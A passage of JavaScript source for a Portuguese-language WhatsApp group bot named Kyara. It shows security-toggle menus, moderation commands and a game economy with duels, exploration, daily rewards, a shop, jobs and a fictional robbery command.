btn("🌐 ANTIGROUP", `${prefix}antigroup on`),
btn("📎 HARD", `${prefix}antilinkhard on`)
]
),

criarCard(
"🚨 KYARA SECURITY • SPAM",
`╭━━〔 🚨 ANTI SPAM 〕━━⬣

┃ 📛 ${prefix}antispam on/off
┃ ⚡ ${prefix}antiflood on/off
┃ 🤖 ${prefix}antibot on/off
┃ 💀 ${prefix}antitrava on/off

╰━━━━━━━━━━━━━━⬣`,
[
btn("📛 SPAM", `${prefix}antispam on`),
btn("⚡ FLOOD", `${prefix}antiflood on`),
btn("💀 TRAVA", `${prefix}antitrava on`)
]
),

criarCard(
"👮 KYARA SECURITY • MOD",
`╭━━〔 👮 MODERAÇÃO 〕━━⬣
┃ ⚠️ ${prefix}warn @user
┃ ♻️ ${prefix}unwarn @user
┃ 📋 ${prefix}warnings @user
┃ 🔇 ${prefix}mute @user
┃ 🔊 ${prefix}unmute @user
┃ 🚷 ${prefix}ban @user
┃ ✅ ${prefix}unban @user
╰━━━━━━━━━━━━━━⬣`,
[
btn("⚠️ WARN", `${prefix}warn`),
btn("📋 WARNS", `${prefix}warnings`),
btn("🚷 BAN", `${prefix}ban`)
]
),

criarCard(
"👑 KYARA SECURITY • ADM",
`╭━━〔 👑 PROTEÇÃO ADM 〕━━⬣

┃ 👑 ${prefix}antiadm on/off
┃ 📉 ${prefix}antidemote on/off
┃ 📈 ${prefix}antipromote on/off
┃ 🚫 ${prefix}antiban on/off

╰━━━━━━━━━━━━━━⬣`,
[
btn("👑 ANTIADM", `${prefix}antiadm on`),
btn("📉 DEMOTE", `${prefix}antidemote on`),
btn("🚫 ANTIBAN", `${prefix}antiban on`)
]
),

criarCard(
"📱 KYARA SECURITY • MÍDIA",
`╭━━〔 📱 PROTEÇÃO DE MÍDIA 〕━━⬣

┃ 🎵 ${prefix}antiaudio on/off
┃ 🎥 ${prefix}antivideo on/off
┃ 🖼️ ${prefix}antiimg on/off
┃ 📄 ${prefix}antidoc on/off
┃ 🎭 ${prefix}antisticker on/off

╰━━━━━━━━━━━━━━⬣`,
[
btn("🎵 ÁUDIO", `${prefix}antiaudio on`),
btn("🎥 VÍDEO", `${prefix}antivideo on`),
btn("🎭 STICKER", `${prefix}antisticker on`)
]
),

criarCard(
"🌎 KYARA SECURITY • MEMBROS",
`╭━━〔 🌎 CONTROLE DE MEMBROS 〕━━⬣

┃ 🇧🇷 ${prefix}antifake on/off
┃ 👥 ${prefix}antiraid on/off
┃ 🚪 ${prefix}antientrar on/off
┃ 🚫 ${prefix}antisair on/off

╰━━━━━━━━━━━━━━⬣`,
[
btn("🇧🇷 FAKE", `${prefix}antifake on`),
btn("👥 RAID", `${prefix}antiraid on`),
btn("🚪 ENTRAR", `${prefix}antientrar on`)
]
),

criarCard(
"🔥 KYARA SECURITY • ESPECIAL",
`╭━━〔 🔥 PROTEÇÕES ESPECIAIS 〕━━⬣

┃ 👻 ${prefix}antiinvisivel on/off
┃ 📢 ${prefix}antitagall on/off
┃ ☠️ ${prefix}antimention on/off
┃ 📞 ${prefix}anticall on/off
┃ 💣 ${prefix}antipv on/off

╰━━━━━━━━━━━━━━⬣`,
[
btn("👻 INVISÍVEL", `${prefix}antiinvisivel on`),
btn("📢 TAGALL", `${prefix}antitagall on`),
btn("📞 CALL", `${prefix}anticall on`)
]
),

criarCard(
"⚙️ KYARA SECURITY • GERAL",
`╭━━〔 ⚙️ CONFIGURAÇÕES 〕━━⬣

┃ 🛡️ ${prefix}seguranca on
┃ 🔓 ${prefix}seguranca off
┃ 📊 ${prefix}security
┃ 📜 ${prefix}logs

╰━━━━━━━━━━━━━━⬣`,
[
btn("🛡️ ATIVAR TUDO", `${prefix}seguranca on`),
btn("🔓 DESATIVAR", `${prefix}seguranca off`),
btn("📊 STATUS", `${prefix}security`)
]
)
]
};

await sock.relayMessage(
from,
{
interactiveMessage: {
contextInfo: {
participant: sender,
mentionedJid: [sender],
quotedMessage: {
conversation: "🛡️ KYARA SECURITY"
}
},
body: {
text: "🛡️ ᴢʏʀᴏɴ sᴇᴄᴜʀɪᴛʏ ᴄᴀʀʀᴏssᴇʟ ❤️‍🔥"
},
carouselMessage
}
},
{}
);

} catch (e) {
console.error("[MENU SEGURANÇA ERROR]", e);
reply("❌ Erro ao abrir o menu de segurança.");
}
break;
}

case 'menuu': { 
await reagir(from, "❤️‍🔥")
await conn.sendMessage(from, {
image: FotoMenu,
caption: menus?.menu(prefix, sender, NickDono, NomeBot, data, hora, NumberDono, version),
mentions: [sender, info?.key?.remoteJid]
}, { quoted: selo });
}
break;

case 'menufigurinhas':
case 'menufig': { 
await reagir(from, "🔥");
await conn.sendMessage(from, {
image: FotoMenu,
caption: menus?.menuStickers(prefix, sender),
mentions: [sender, info?.key?.remoteJid]
}, { quoted: selo });
}
break;

case 'menuadm': { 
await reagir(from, "👑")
await conn.sendMessage(from, {
image: FotoMenu,
caption: menus?.menuadm(prefix, sender),
mentions: [sender, info?.key?.remoteJid]
}, { quoted: selo });
}
break;

case 'menu18': { 
await reagir(from, "🔞")
await conn.sendMessage(from, {
image: FotoMenu,
caption: menus?.menu18(prefix, sender),
mentions: [sender, info?.key?.remoteJid]
}, { quoted: selo });
}
break;

case 'menudono': { 
await reagir(from, "🤴")
await conn.sendMessage(from, {
image: FotoMenu,
caption: menus?.menuDono(prefix, sender),
mentions: [sender, info?.key?.remoteJid]
}, { quoted: selo });
}
break;

case 'menudown': { 
await reagir(from, "🎶")
await conn.sendMessage(from, {
image: FotoMenu,
caption: menus?.menuDown(prefix, sender),
mentions: [sender, info?.key?.remoteJid]
}, { quoted: selo });
}
break;

case 'menumemb': { 
await reagir(from, "🫪")
await conn.sendMessage(from, {
image: FotoMenu,
caption: menumemb(prefix, sender),
mentions: [sender, info?.key?.remoteJid]
}, { quoted: selo });
}
break;

case 'menubrink':
case 'brincadeiras': {
  await reagir(from, "😂")
  await conn.sendMessage(from, {
    image: FotoMenu,
    caption: menubrink(prefix, sender),
    mentions: [sender, info?.key?.remoteJid],
    
  }, { quoted: selo });
} break;

case 'menurpg':
case 'rpg': {
await reagir(from, "⚔️");

const FotoMenu = fs.readFileSync('./dono/menus/Foto-menu/img-menu.jpg');

await conn.sendMessage(from, {
image: FotoMenu,
caption: menuRPG(prefix, sender),
mentions: [sender]
}, { quoted: selo });

}
break;

//COMANDO RPG

case 'duelo': {
try {
if (!isGroup) return reply('❌ Esse comando só funciona em grupo.');

const alvo = info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

if (!alvo) return reply(`⚔️ Marque alguém para duelar.\n\nExemplo: ${prefix}duelo @user`);

if (alvo === sender) return reply('❌ Você não pode duelar contra você mesmo.');

const id1 = sender.replace(/\D/g, '');
const id2 = alvo.replace(/\D/g, '');

if (!global.banco) global.banco = {};

for (const id of [id1, id2]) {
if (!global.banco[id]) {
global.banco[id] = {
saldo: 0,
xp: 0,
nivel: 1,
vitorias: 0,
derrotas: 0,
inventario: {}
};
}
}

const player1 = global.banco[id1];
const player2 = global.banco[id2];

const poder1 = Math.floor(Math.random() * 100) + (player1.nivel * 10);
const poder2 = Math.floor(Math.random() * 100) + (player2.nivel * 10);

let vencedor, perdedor, vencedorId, perdedorId;

if (poder1 >= poder2) {
vencedor = sender;
perdedor = alvo;
vencedorId = id1;
perdedorId = id2;
} else {
vencedor = alvo;
perdedor = sender;
vencedorId = id2;
perdedorId = id1;
}

const recompensa = Math.floor(Math.random() * 1000) + 500;
const xpGanho = Math.floor(Math.random() * 200) + 100;

global.banco[vencedorId].saldo += recompensa;
global.banco[vencedorId].xp += xpGanho;
global.banco[vencedorId].vitorias++;
global.banco[perdedorId].derrotas++;

const novoNivel = Math.floor(global.banco[vencedorId].xp / 1000) + 1;
if (novoNivel > global.banco[vencedorId].nivel) {
global.banco[vencedorId].nivel = novoNivel;
}

reply(`
╔═━───────━━▒۞▒━━───────━═╗
┃ ⚔️🌌 𝐃𝐔𝐄𝐋𝐎 𝐑𝐏𝐆 🌌⚔️
├━━━━━━━━━━━━━━━━━━━━
┃ 🧙 Jogador 1: @${sender.split('@')[0]}
┃ 🧛 Jogador 2: @${alvo.split('@')[0]}
┃
┃ ⚡ Poder 1: ${poder1}
┃ ⚡ Poder 2: ${poder2}
├━━━━━━━━━━━━━━━━━━━━
┃ 👑 Vencedor:
┃ @${vencedor.split('@')[0]}
┃
┃ ☠️ Perdedor:
┃ @${perdedor.split('@')[0]}
├━━━━━━━━━━━━━━━━━━━━
┃ 💰 Recompensa: R$${recompensa}
┃ ⭐ XP ganho: +${xpGanho}
┃ 🏆 Nível vencedor: ${global.banco[vencedorId].nivel}
╚═━───────━━▒۞▒━━───────━═╝
`, { mentions: [sender, alvo] });

} catch (e) {
console.error(e);
reply('❌ Erro no duelo.');
}
}
break;

case 'explorar': {
try {
const id = sender.replace(/\D/g, '');

if (!global.banco) global.banco = {};

if (!global.banco[id]) {
global.banco[id] = {
saldo: 0,
xp: 0,
nivel: 1,
inventario: {}
};
}

const sorte = Math.random() * 100;

let resultado;

if (sorte <= 3) {
resultado = {
tipo: "boss",
local: "🐉 Covil do Dragão Ancestral",
item: "🥚 Ovo de Dragão",
valor: 10000,
xp: 1000,
emoji: "👑"
};

} else if (sorte <= 10) {
resultado = {
tipo: "lendario",
local: "🏛️ Câmara Perdida dos Reis",
item: "👑 Coroa Lendária",
valor: 5000,
xp: 500,
emoji: "💎"
};

} else if (sorte <= 25) {
resultado = {
tipo: "epico",
local: "🌋 Vulcão Esquecido",
item: "🔥 Núcleo de Lava",
valor: 2500,
xp: 250,
emoji: "⚜️"
};

} else if (sorte <= 45) {
resultado = {
tipo: "raro",
local: "🏔️ Montanhas Geladas",
item: "💠 Cristal Congelado",
valor: 1200,
xp: 120,
emoji: "✨"
};

} else if (sorte <= 90) {
resultado = {
tipo: "comum",
local: "🌲 Floresta Sombria",
item: "🪵 Madeira Antiga",
valor: 500,
xp: 50,
emoji: "📦"
};

} else {
const perda = Math.floor(Math.random() * 500) + 100;

global.banco[id].saldo =
Math.max(0, global.banco[id].saldo - perda);

return reply(`
╔═══『 ☠️ ARMADILHA 』═══╗

💀 Você caiu em uma armadilha!

💸 Perdeu: R$${perda}

🩹 Tome mais cuidado na próxima exploração.

╚════════════════╝
`);
}

global.banco[id].saldo += resultado.valor;
global.banco[id].xp += resultado.xp;

if (!global.banco[id].inventario[resultado.item])
global.banco[id].inventario[resultado.item] = 0;

global.banco[id].inventario[resultado.item]++;

const novoNivel =
Math.floor(global.banco[id].xp / 1000) + 1;

if (novoNivel > global.banco[id].nivel) {
global.banco[id].nivel = novoNivel;

reply(`
🎉 LEVEL UP!

🏆 Novo nível: ${novoNivel}
`);
}

reply(`
╔═══『 🧭 EXPLORAÇÃO 』═══╗

📍 Local:
${resultado.local}

${resultado.emoji} Raridade:
${resultado.tipo.toUpperCase()}

🎁 Item:
${resultado.item}

💰 Valor:
R$${resultado.valor}

⭐ XP:
+${resultado.xp}

🏆 Nível:
${global.banco[id].nivel}

💳 Saldo:
R$${global.banco[id].saldo}

╚════════════════╝
`);

} catch (err) {
console.error(err);
reply('❌ Erro ao explorar.');
}
}
break;

//COMANDOS ECONOMIA

case 'daily': {
try {

const cooldown = 86400000; // 24 horas

let user = global.db.data.users[sender];
if (!user) global.db.data.users[sender] = {};
user = global.db.data.users[sender];

if (!user.money) user.money = 0;
if (!user.exp) user.exp = 0;
if (!user.lastDaily) user.lastDaily = 0;

if (Date.now() - user.lastDaily < cooldown) {
return reply(
`🎁 Você já resgatou seu prêmio diário!

⏳ Volte em:
${formatarTempo(cooldown - (Date.now() - user.lastDaily))}`
);
}

const recompensa = Math.floor(Math.random() * 5000) + 1000;
const xp = Math.floor(Math.random() * 100) + 20;

user.money += recompensa;
user.exp += xp;
user.lastDaily = Date.now();

const gifs = [
'./midias/daily1.mp4',
'./midias/daily2.mp4'
];

const gifAleatorio = gifs[Math.floor(Math.random() * gifs.length)];

await conn.sendMessage(from, {
video: fs.readFileSync(gifAleatorio),
gifPlayback: true,
caption: `
╭━━〔 🎁 DAILY REWARD 〕━━⬣
┃ 💰 Dinheiro ganho:
┃ R$${recompensa}
┃
┃ ⭐ XP ganho:
┃ ${xp}
┃
┣━━━━━━━━━━━━━━⬣
┃ 💵 Carteira:
┃ R$${user.money}
┃
┃ ⭐ XP Total:
┃ ${user.exp}
╰━━━━━━━━━━━━━━⬣
`
}, { quoted: selo });

} catch (e) {
console.log('[DAILY ERROR]', e);
reply('❌ Erro ao resgatar o daily.');
}
}
break;

case 'compraritem': {
try {
const idItem = Number(args[0]);

if (!idItem) {
return reply(`❌ Use: ${prefix}compraritem número\nExemplo: ${prefix}compraritem 1`);
}

const item = lojaItems.find(i => i.id === idItem);

if (!item) {
return reply(`❌ Item inválido.\nUse ${prefix}loja para ver os itens.`);
}

const db = carregarBanco();
const userId = getUserBancoId(info, sender, isGroup);

verificarConta(db, userId);

let user = db[userId];

if (!user.saldo) user.saldo = 0;
if (!user.inventario) user.inventario = {};

if (user.saldo < item.preco) {
return reply(`❌ Saldo insuficiente.

🛒 Item: ${item.nome}
💰 Preço: R$${item.preco}
💵 Seu saldo: R$${user.saldo}`);
}

user.saldo -= item.preco;

if (!user.inventario[item.item]) {
user.inventario[item.item] = 0;
}

user.inventario[item.item]++;

salvarBanco(db);

return reply(`╭━━〔 ✅ COMPRA REALIZADA 〕━━⬣
┃ 🛒 Item: ${item.nome}
┃ 💰 Valor: R$${item.preco}
┃ 💵 Saldo restante: R$${user.saldo}
┃ 🎒 Quantidade no inventário: ${user.inventario[item.item]}
╰━━━━━━━━━━━━━━⬣`);

} catch (e) {
console.log('[COMPRARITEM ERROR]', e);
reply('❌ Erro ao comprar item.');
}
}
break;

case 'loja': {
try {

const sections = [
{
title: "🛡️ Utilidades",
rows: [
{ header: "Proteção", title: "🛡️ Escudo Anti-Assalto", description: "R$ 5.000", id: `${prefix}compraritem 1` },
{ header: "Sorte", title: "🍀 Amuleto da Sorte", description: "R$ 3.500", id: `${prefix}compraritem 2` },
{ header: "Premium", title: "💼 Maleta Premium", description: "R$ 8.000", id: `${prefix}compraritem 3` },
{ header: "VIP", title: "👑 VIP Econômico", description: "R$ 15.000", id: `${prefix}compraritem 4` }
]
},
{
title: "📱 Eletrônicos",
rows: [
{ header: "Celular", title: "📱 Motorola K10", description: "R$ 2.000", id: `${prefix}compraritem 5` },
{ header: "Celular", title: "📱 Samsung A15", description: "R$ 7.500", id: `${prefix}compraritem 6` },
{ header: "Celular", title: "📱 Samsung S26", description: "R$ 25.000", id: `${prefix}compraritem 7` },
{ header: "Notebook", title: "💻 Notebook", description: "R$ 18.000", id: `${prefix}compraritem 8` },
{ header: "PC", title: "🖥️ PC Gamer", description: "R$ 50.000", id: `${prefix}compraritem 9` },
{ header: "Relógio", title: "⌚ Smartwatch", description: "R$ 6.500", id: `${prefix}compraritem 10` },
{ header: "Áudio", title: "🎧 Headset Gamer", description: "R$ 4.500", id: `${prefix}compraritem 11` }
]
},
{
title: "🚗 Veículos",
rows: [
{ header: "Bike", title: "🚲 Bicicleta", description: "R$ 12.000", id: `${prefix}compraritem 12` },
{ header: "Moto", title: "🏍️ Moto 160", description: "R$ 70.000", id: `${prefix}compraritem 13` },
{ header: "Moto", title: "🏍️ Ninja 400", description: "R$ 150.000", id: `${prefix}compraritem 14` },
{ header: "Carro", title: "🚗 Peugeot", description: "R$ 250.000", id: `${prefix}compraritem 15` },
{ header: "Carro", title: "🚗 BMW M5", description: "R$ 800.000", id: `${prefix}compraritem 16` }
]
},
{
title: "🏠 Imóveis",
rows: [
{ header: "Casa", title: "🏠 Casa Simples", description: "R$ 500.000", id: `${prefix}compraritem 17` },
{ header: "Luxo", title: "🏡 Casa de Luxo", description: "R$ 2.500.000", id: `${prefix}compraritem 18` },
{ header: "Mansão", title: "🏰 Mansão", description: "R$ 10.000.000", id: `${prefix}compraritem 19` }
]
},
{
title: "💎 Investimentos",
rows: [
{ header: "Diamante", title: "💎 Diamante Raro", description: "R$ 50.000", id: `${prefix}compraritem 20` },
{ header: "Ouro", title: "🥇 Barra de Ouro", description: "R$ 30.000", id: `${prefix}compraritem 21` },
{ header: "Cofre", title: "💰 Cofre Bancário", description: "R$ 90.000", id: `${prefix}compraritem 22` }
]
},
{
title: "✈️ Luxo Extremo",
rows: [
{ header: "Jato", title: "🛫 Jato Particular", description: "R$ 50.000.000", id: `${prefix}compraritem 23` },
{ header: "Helicóptero", title: "🚁 Helicóptero", description: "R$ 20.000.000", id: `${prefix}compraritem 24` }
]
}
];

await conn.relayMessage(from, {
interactiveMessage: {
body: {
text: "🛒 *LOJA KYARA STORE*\n\nEscolha uma categoria abaixo:"
},
footer: {
text: "💰 Economia RPG"
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "🛍️ Abrir Catálogo",
sections
})
}
]
}
}
}, {});

} catch (e) {
console.log('[LOJA ERROR]', e);
reply('❌ Erro ao abrir a loja.');
}
}
break;

case 'topmoney':
case 'rankmoney':
case 'ricos': {
try {

if (!isGroup) return reply('❌ Este comando só pode ser usado em grupos.');

const banco = JSON.parse(fs.readFileSync('./database/banco.json', 'utf8'));
const metadata = await conn.groupMetadata(from);

let users = Object.entries(banco)
.filter(([_, user]) => Number(user.saldo || 0) > 0)
.sort((a, b) => Number(b[1].saldo || 0) - Number(a[1].saldo || 0))
.slice(0, 5);

if (!users.length) return reply('❌ Nenhum participante do grupo possui dinheiro.');

let texto = `╭━━〔 🏆 TOP 5 RICOS 〕━━⬣\n\n`;

for (let i = 0; i < users.length; i++) {
const [jid, user] = users[i];

let nome = jid.split('@')[0];

const participante = metadata.participants.find(p => p.id === jid);

if (participante) {
nome =
participante.notify ||
participante.name ||
(await conn.getName(jid)) ||
jid.split('@')[0];
}

const medalha =
i === 0 ? '🥇' :
i === 1 ? '🥈' :
i === 2 ? '🥉' :
i === 3 ? '🏅' :
'🎖️';

texto += `${medalha} ${i + 1}° ${nome}\n`;
texto += `💰 R$ ${Number(user.saldo || 0).toLocaleString('pt-BR')}\n\n`;
}

texto += '╰━━━━━━━━━━━━━━⬣';

const imagens = [
'./midias/top1.jpeg',
'./midias/top2.jpeg'
];

await conn.sendMessage(from, {
image: fs.readFileSync(imagens[Math.floor(Math.random() * imagens.length)]),
caption: texto
}, { quoted: selo });

} catch (err) {
console.error(err);
reply('❌ Erro ao gerar o ranking.');
}
}
break;

case 'assaltar':
case 'roubar': {
try {
const cooldown = 1800000; // 30 min
const prisao = 600000; // 10 min

let user = global.db.data.users[sender];
if (!user) global.db.data.users[sender] = {};
user = global.db.data.users[sender];

if (!user.money) user.money = 0;
if (!user.lastAssalto) user.lastAssalto = 0;
if (!user.presoAte) user.presoAte = 0;

if (Date.now() < user.presoAte) {
return reply(`🚔 Você está preso!\n⏳ Falta: ${formatarTempo(user.presoAte - Date.now())}`);
}

if (Date.now() - user.lastAssalto < cooldown) {
return reply(`⏳ Aguarde ${formatarTempo(cooldown - (Date.now() - user.lastAssalto))}`);
}

const alvo = jidNormalizedUser(sender_ou_n);

if (!alvo) {
    return reply('Marque ou responda a mensagem de alguém.');
}

if (alvo === sender) {
    return reply('❌ Você não pode se assaltar.');
}

if (!alvo) {
    return reply(`Marque ou responda a mensagem de alguém.`);
}

console.log({
    sender,
    alvo,
    menc_jid,
    marc_tds,
    menc_prt
});

if (alvo === sender) return reply(`❌ Você não pode se assaltar.`);

let vitima = global.db.data.users[alvo];
if (!vitima) return reply(`Usuário não encontrado.`);

if (!vitima.money) vitima.money = 0;

if (vitima.money < 100) {
return reply(`💸 Essa pessoa está sem dinheiro.`);
}

user.lastAssalto = Date.now();

const chance = Math.random();

if (chance < 0.45) {

user.presoAte = Date.now() + prisao;

const gifsPrisao = [
'./midias/preso1.mp4',
'./midias/preso2.mp4',
'./midias/preso3.mp4'
];

const gifAleatorio = gifsPrisao[Math.floor(Math.random() * gifsPrisao.length)];

await conn.sendMessage(from, {
video: fs.readFileSync(gifAleatorio),
gifPlayback: true,
caption: `
╭━━〔 🚔 PRESO 〕━━⬣
┃ Você tentou assaltar alguém
┃ e foi capturado pela polícia.
┃
┃ ⛓️ Prisão: 10 minutos
┃ 🚫 Não poderá falar.
╰━━━━━━━━━━━━━━⬣
`
}, { quoted: selo });

return;
}

const valor = Math.floor(Math.random() * Math.min(3000, vitima.money)) + 100;

vitima.money -= valor;
user.money += valor;

const gifsRoubo = [
'./midias/roubo1.mp4',
'./midias/roubo2.mp4',
'./midias/roubo3.mp4'
];

const gifAleatorio = gifsRoubo[Math.floor(Math.random() * gifsRoubo.length)];

await conn.sendMessage(from, {
video: fs.readFileSync(gifAleatorio),
gifPlayback: true,
caption: `
╭━━〔 🥷 ASSALTO 〕━━⬣
┃ Assalto realizado!
┃
┃ 💰 Roubado: R$${valor}
┃ 💵 Carteira: R$${user.money}
╰━━━━━━━━━━━━━━⬣
`
}, { quoted: selo });

} catch (e) {
console.log('[ASSALTO ERROR]', e);
reply('Erro ao assaltar.');
}
}
break;

case 'work':
case 'trabalhar': {
try {
const cooldown = 900000;

const db = carregarBanco();
const userId = getUserBancoId(info, sender, isGroup);
verificarConta(db, userId);

let user = db[userId];

if (!user.saldo) user.saldo = 0;
if (!user.xp) user.xp = 0;
if (!user.lastWork) user.lastWork = 0;

if (!user.empregoId) {
return reply(`❌ Você não possui um emprego.

Use ${prefix}empregos para ver os empregos disponíveis.
Depois use ${prefix}emprego número para escolher um.`);
}

const emprego = empregos.find(e => e.id === user.empregoId);

if (!emprego) {
delete user.emprego;
delete user.empregoId;
salvarBanco(db);
return reply(`❌ Seu emprego não existe mais.

Use ${prefix}empregos para escolher outro.`);
}

if (Date.now() - user.lastWork < cooldown) {
return reply(`⏳ Você já trabalhou recentemente.

🕒 Tempo restante:
${formatarTempo(cooldown - (Date.now() - user.lastWork))}`);
}

const salario = Math.floor(Math.random() * (emprego.max - emprego.min + 1)) + emprego.min;
const xpGanho = Math.floor(Math.random() * 20) + 5;

user.saldo = Number(user.saldo || 0) + salario;
user.xp = Number(user.xp || 0) + xpGanho;
user.lastWork = Date.now();

salvarBanco(db);

const gifs = [
'./midias/work1.mp4',
'./midias/work2.mp4',
'./midias/work3.mp4',
'./midias/work4.mp4',
'./midias/work5.mp4'
];

const gifAleatorio = gifs[Math.floor(Math.random() * gifs.length)];

const texto = `╭━━〔 💼 TRABALHO 〕━━⬣
┃ 👨‍💼 Cargo:
┃ ${emprego.nome}
┃
┃ 💰 Salário Recebido:
┃ R$ ${salario}
┃
┃ ⭐ XP Ganho:
┃ ${xpGanho}
┃
┣━━━━━━━━━━━━━━⬣
┃ 💵 Carteira:
┃ R$ ${user.saldo}
┃
┃ ⭐ XP Total:
┃ ${user.xp}
╰━━━━━━━━━━━━━━⬣`;

if (fs.existsSync(gifAleatorio)) {
await conn.sendMessage(from, {
video: fs.readFileSync(gifAleatorio),
gifPlayback: true,
caption: texto
}, { quoted: selo });
} else {
await conn.sendMessage(from, {
text: texto
}, { quoted: selo });
}

} catch (e) {
console.log('[WORK ERROR]', e);
reply('❌ Erro ao executar o trabalho.');
}
}
break;

case 'empregos': {
const db = carregarBanco();
const userId = getUserBancoId(info, sender, isGroup);
verificarConta(db, userId);

let user = db[userId];

if (!user.xp) user.xp = 0;

let txt = `╭━━〔 💼 EMPREGOS 〕━━⬣\n`;
txt += `┃ Seu XP: ${user.xp}\n`;
txt += `┃ Emprego atual: ${user.emprego || "Nenhum"}\n`;
txt += `┣━━━━━━━━━━━━━━⬣\n`;

for (const e of empregos) {
txt += `┃ ${e.id}. ${e.nome}\n`;
txt += `┃ ⭐ XP necessário: ${e.xp}\n`;
txt += `┃ 💰 Salário: R$${e.min} - R$${e.max}\n`;
txt += `┃\n`;
}

txt += `╰━━━━━━━━━━━━━━⬣\n\n`;
txt += `Use: ${prefix}emprego número\n`;
txt += `Exemplo: ${prefix}emprego 2`;

salvarBanco(db);

const gifs = [
'./midias/empregos1.mp4',
'./midias/empregos2.mp4'
];

const gifAleatorio = gifs[Math.floor(Math.random() * gifs.length)];

if (fs.existsSync(gifAleatorio)) {
await conn.sendMessage(from, {
video: fs.readFileSync(gifAleatorio),
gifPlayback: true,
caption: txt
}, { quoted: selo });
} else {
await conn.sendMessage(from, {
text: txt
}, { quoted: selo });
}
}
break;

case 'emprego': {
const db = carregarBanco();
const userId = getUserBancoId(info, sender, isGroup);
verificarConta(db, userId);

let user = db[userId];

if (!q) return reply(`Use: ${prefix}emprego número\nExemplo: ${prefix}emprego 1`);

const id = Number(q);
const emprego = empregos.find(e => e.id === id);

if (!emprego) return reply(`❌ Emprego inválido. Use ${prefix}empregos`);

const xpUser = Number(user.xp || 0);

// Apenas o dono do bot pode pegar empregos exclusivos
if (emprego.dono && !isOwner) {
return reply(`❌ Esse emprego é exclusivo do dono da Kyara.

💼 Cargo: ${emprego.nome}
👑 Apenas o criador da Kyara pode possuir esse cargo.`);
}

if (xpUser < emprego.xp) {
return reply(`❌ Você não tem XP suficiente.

💼 Emprego: ${emprego.nome}
⭐ Precisa: ${emprego.xp} XP
⭐ Seu XP: ${xpUser}`);
}

user.emprego = emprego.nome;
user.empregoId = emprego.id;

salvarBanco(db);

return reply(`╭━━〔 💼 EMPREGO DEFINIDO 〕━━⬣
┃ ✅ Contratado com sucesso!
┃
┃ 👨‍💼 Cargo: ${emprego.nome}
┃ 💰 Salário: R$${emprego.min} - R$${emprego.max}
┃ ⭐ XP Necessário: ${emprego.xp === Infinity ? "∞" : emprego.xp}
┃ ⭐ Seu XP: ${xpUser}
┃
┃ Use ${prefix}work para trabalhar.
╰━━━━━━━━━━━━━━⬣`);
}
break;

case 'sairdoemprego':
case 'demitir': {
let user = global.db.data.users[sender];
if (!user) global.db.data.users[sender] = {};
user = global.db.data.users[sender];

if (!user.emprego) return reply(`❌ Você não tem emprego.`);

const antigo = user.emprego;

delete user.emprego;
delete user.empregoId;

const gifs = [
'./midias/demitido1.mp4',
'./midias/demitido2.mp4',
'./midias/demitido3.mp4'
];

const gifAleatorio = gifs[Math.floor(Math.random() * gifs.length)];

await conn.sendMessage(from, {
video: fs.readFileSync(gifAleatorio),
gifPlayback: true,
caption: `
╭━━〔 🚪 DEMISSÃO 〕━━⬣
┃ Você saiu do emprego:
┃
┃ 💼 ${antigo}
┃
┃ 😔 Agora você está desempregado.
┃
┃ Use ${prefix}empregos
┃ para escolher outro emprego.
╰━━━━━━━━━━━━━━⬣
`
}, { quoted: selo });

}
break;

//comandos segurança 

case 'logs': {
if (!isGroup) return reply('❌ Apenas em grupos.');

const gp = dataGp[0];
const status = (v) => v ? '🟢' : '🔴';

reply(`
╭━━━〔 📜 LOGS DO GRUPO 〕━━━⬣

🛡️ SISTEMAS DE SEGURANÇA

${status(gp.antilink)} AntiLink
${status(gp.antigroup)} AntiGroup
${status(gp.antispam)} AntiSpam
${status(gp.antiflood)} AntiFlood
${status(gp.antibot)} AntiBot
${status(gp.antitrava)} AntiTrava

${status(gp.antiadm)} AntiADM
${status(gp.antipromote)} AntiPromote
${status(gp.antidemote)} AntiDemote
${status(gp.antiban)} AntiBan

${status(gp.antiaudio)} AntiAudio
${status(gp.antivideo)} AntiVideo
${status(gp.antiimg)} AntiImg
${status(gp.antidoc)} AntiDoc
${status(gp.antisticker)} AntiSticker

${status(gp.antifake)} AntiFake
${status(gp.antiraid)} AntiRaid
${status(gp.antientrar)} AntiEntrar
${status(gp.antisair)} AntiSair

${status(gp.antiinvisivel)} AntiInvisível
${status(gp.antitagall)} AntiTagAll
${status(gp.antimention)} AntiMention

${status(gp.anticall)} AntiCall
${status(gp.antipv)} AntiPV

╰━━━━━━━━━━━━━━━━━━⬣
🤖 Kyara Security System
`);
}
break;

case 'seguranca':
case 'security': {
if (!isGroup) return reply('❌ Apenas em grupos.');

const gp = dataGp[0];
const status = (v) => v ? '🟢 ON' : '🔴 OFF';

const sistemas = [
gp.antilink, gp.antigroup, gp.antilinkhard,
gp.antispam, gp.antiflood, gp.antibot, gp.antitrava,
gp.antiadm, gp.antipromote, gp.antidemote, gp.antiban,
gp.antiaudio, gp.antivideo, gp.antiimg, gp.antidoc, gp.antisticker,
gp.antifake, gp.antiraid, gp.antientrar, gp.antisair,
gp.antiinvisivel, gp.antitagall, gp.antimention,
gp.anticall, gp.antipv
];

const ativos = sistemas.filter(Boolean).length;
const total = sistemas.length;
const porcentagem = Math.floor((ativos / total) * 100);

reply(`
╔═━━━〔 🛡️ 𝐙𝐘𝐑𝐎𝐍 𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 〕━━━═╗
┃ ⚡ 𝐏𝐫𝐨𝐭𝐞𝐜̧𝐚̃𝐨 𝐝𝐨 𝐠𝐫𝐮𝐩𝐨
┃ 👥 Grupo: ${NomeGrupo}
┃ 📊 Segurança: ${porcentagem}%
┃ 🧩 Sistemas ativos: ${ativos}/${total}
╠═━━━〔 🔗 𝐋𝐈𝐍𝐊𝐒 〕━━━═╣
┃ 🔗 AntiLink: ${status(gp.antilink)}
┃ 🌐 AntiGroup: ${status(gp.antigroup)}
┃ 📎 AntiLinkHard: ${status(gp.antilinkhard)}
╠═━━━〔 🚨 𝐒𝐏𝐀𝐌 〕━━━═╣
┃ 📛 AntiSpam: ${status(gp.antispam)}
┃ ⚡ AntiFlood: ${status(gp.antiflood)}
┃ 🤖 AntiBot: ${status(gp.antibot)}
┃ 💀 AntiTrava: ${status(gp.antitrava)}
╠═━━━〔 👑 𝐀𝐃𝐌 〕━━━═╣
┃ 👑 AntiADM: ${status(gp.antiadm)}
┃ 📈 AntiPromote: ${status(gp.antipromote)}
┃ 📉 AntiDemote: ${status(gp.antidemote)}
